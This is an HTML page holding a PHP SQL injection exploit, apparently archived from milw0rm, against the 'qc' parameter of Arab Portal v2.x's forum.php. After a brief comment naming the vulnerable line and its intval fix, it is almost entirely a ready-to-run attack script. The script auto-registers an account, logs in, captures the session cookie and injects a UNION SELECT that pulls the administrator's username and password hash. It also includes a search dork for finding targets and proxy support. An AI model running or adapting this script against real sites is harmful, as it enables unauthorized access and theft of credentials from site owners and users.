<html><head><title>Arab Portal v2.x (forum.php qc) Remote SQL Injection Exploit</title></head><pre>&lt;?
 
/*
 
            [  Arab Portal v2.x (forum.php qc) SQL Injection Exploit  ]
            
        [-] Author        : rEcruit
        [-] Mail            : recru1t@ymail.com
        [-] Download   : http://arab-portal.net/download.php
        
        [-] Vuln in  ./forum.php  Line: 1503
        
            [code]
 
                if((isset($apt-&gt;get[qc])) &amp;&amp;(!isset($apt-&gt;get[qp])))
                {
                   $qc = $apt-&gt;get[qc];  
                   $result = $apt-&gt;query(&quot;select name,comment from rafia_comment where id='$qc'&quot;);
                   $row = $apt-&gt;dbarray($result);
                   $apt-&gt;row['quote'] = &quot;\n\n\n[QUOTE]..... :&quot;.$row['name'].&quot;\n&quot;.$row['comment'].&quot;[/QUOTE]&quot;;
                }
 
            [/code]
 
 
        [-] Debug :
        
            [code]
                $qc = intval($apt-&gt;get[qc]);  
            [/code]
 
        [-] Note : Path to Control Panel   &quot;/admin/&quot; .
        
        [-] Condition : magic_quotes_gpc = Off
 
*/
 
    error_reporting(0);
    ini_set(&quot;max_execution_time&quot;,0);
    ini_set(&quot;default_socket_timeout&quot;,5);
 
    function Usage()
    {
            print &quot;\n\n&quot;;
            print &quot;/------------------------------------------------------------\\\n&quot;;
            print &quot;|    Arab Portal v2.x (forum.php qc) SQL Injection Exploit   |\n&quot;;
            print &quot;\------------------------------------------------------------/\n&quot;;
            print &quot;| [-] Author : rEcruit                                       |\n&quot;;
            print &quot;| [-] Mail   : recru1t@ymail.com                             |\n&quot;;
            print &quot;| [-] Greetz : Evil-Cod3r , BlaCK MooN , Fantastic Egypt     |\n&quot;;
            print &quot;|              ALL Sec-Sni.coM Members                       |\n&quot;;
            print &quot;\------------------------------------------------------------/\n&quot;;
            print &quot;| [-] Dork     : \&quot;Powered by: Arab Portal v2\&quot;                |\n&quot;;
            print &quot;| [+] Usage    : php Exploit.php HOST PATH Options           |\n&quot;;
            print &quot;| [-] HOST     : Target server (ip/hostname)                 |\n&quot;;
            print &quot;| [-] PATH     : Path to Arab Portal                         |\n&quot;;
            print &quot;| [-] Options  :                                             |\n&quot;;
            print &quot;|     =&gt;Proxy  :(ex. 0.0.0.0:8080)                           |\n&quot;;
            print &quot;\------------------------------------------------------------/\n&quot;;
            print &quot;\n\n&quot;;
 
        exit;
    }
 
    function Send($Packet,$Payload=false)
    {
        Global $host,$proxy;
        
        if(empty($proxy))
        {
            $Connect    = @fsockopen($host,&quot;80&quot;) or die(&quot;[-] Bad Host .&quot;);
        }else{
            $proxy        = explode(&quot;:&quot;,$proxy);
            $Connect    = @fsockopen($proxy[0],$proxy[1]) or die(&quot;[-] Bad Proxy .&quot;);
        }
 
                $Packet    .= &quot;Host : {$host} \r\n&quot;;
                $Packet    .= &quot;X-Forwarded-For: 127.0.0.1\r\n&quot;;
                $Packet    .= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
                $Packet    .= &quot;Content-Length: &quot;.(strlen($Payload)).&quot;\r\n&quot;;
                $Packet    .= &quot;Connection: close\r\n\r\n&quot;;
                $Packet    .= $Payload;
            
                fputs($Connect,$Packet);
 
                while(!feof($Connect))  
                $Response    .= @fgets($Connect,2048);
 
                fclose($Connect);
        
        return $Response;
    }
    
    function SignUp()
    {
    
        GLOBAL $username,$password,$email,$host,$path;
        
            $Payload = &quot;username={$username}&amp;password={$password}&amp;password2={$password}&amp;email={$email}&amp;email2={$email}&amp;homepage=http://&amp;viewemail=0&amp;showemail=1&amp;html_msg=0&amp;usertheme=portal&amp;spam=regnotspam&amp;remain=279&amp;post={$email}&amp;left=279&amp;I1.x=72&amp;I1.y=6&quot;;
            $Packet    .= &quot;POST {$path}/members.php?action=insert HTTP/1.1 \r\n&quot;;
            $Packet    .= &quot;Referer: http://{$host}/{$path}/members.php?action=signup \r\n&quot;;
    
        return Send($Packet,$Payload);
    }
    
    function Login_Packet()
    {
    
        GLOBAL $username,$password,$host,$path;
            
            $Payload = &quot;username={$username}&amp;userpass={$password}&quot;;
            $Packet    .= &quot;POST {$path}/members.php?action=login HTTP/1.1 \r\n&quot;;
            $Packet    .= &quot;Referer: http://{$host}/{$path}/forum.php\r\n&quot;;
 
        return Send($Packet,$Payload);
    }
 
    function SI_Packet()
    {
    
        GLOBAL $host,$path,$cookie;
            
 
            $Packet    .= &quot;GET {$path}/forum.php?action=addcomment&amp;id=1&amp;qc=-999'+UNION+ALL+SELECT+1,concat(0x313a3a,username,0x3a3a,password,0x3a3a)+FROM+rafia_users+where+userid='1 HTTP/1.1 \r\n&quot;;
            $Packet    .= &quot;Host : {$host} \r\n&quot;;
            $Packet    .= &quot;{$cookie} \r\n&quot;;
            $Packet    .= &quot;Referer: http://{$host}/{$path}/forum.php\r\n&quot;;
            
        return Send($Packet);
    }
    
    function getCookie($Packet)
    {
            $lines    = explode(&quot;\r\n&quot;,$Packet);
            for($i = 0; $i &lt; sizeof($lines); $i++)
            {
                $line    = $lines[$i];
                if(ereg(&quot;PHPSESSID=&quot;,$line))
                {
                    $cookie    = str_replace(&quot;Set-Cookie&quot;,&quot;Cookie&quot;,$line);
                    break;
                }
            }
        return $cookie;
    }
 
    
    if ($argc &lt; 3) Usage();
 
    $host    = $argv[1];
    $path    = $argv[2];
    $proxy    = $argv[3];
    
        
        $username    = &quot;user&quot;.rand(0,10000);
        $password    = &quot;pwd&quot;.rand(0,10000);
        $email        = &quot;email&quot;.rand(0,10000).&quot;@yahoo.com&quot;;
        
        
        Print &quot;\r\n[-] Connecting to {$host} .... \r\n\r\n&quot;;
 
        SignUp();
 
        $cookie    = getCookie(Login_Packet());
 
        $data = split(&quot;::&quot;,SI_Packet());
        
        Print &quot;[-] Username : $data[1]\r\n&quot;;
        Print &quot;[-] Password : $data[2]\r\n&quot;;
            
 
?&gt;

# milw0rm.com [2009-08-01]</pre></html>